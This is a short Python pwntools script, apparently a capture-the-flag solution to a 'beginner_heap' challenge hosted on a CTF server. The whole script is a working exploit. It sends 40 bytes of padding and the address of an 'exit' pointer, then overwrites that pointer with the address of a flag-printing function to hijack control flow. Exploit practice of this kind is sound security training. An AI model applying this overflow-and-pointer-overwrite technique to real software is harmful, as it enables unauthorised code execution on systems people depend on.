#!/usr/bin/python3

from pwn import *

#p = process("./beginner_heap")
p = remote("ctf.j0n9hyun.xyz", 3016)
#context.log_level = 'debug'

padding = b"A"*40

exit = 0x601068
flag = 0x400826

payload = padding
payload += p64(exit)

p.sendline(payload)
p.sendline(p64(flag))

log.info(p.recvline().decode('utf-8'))
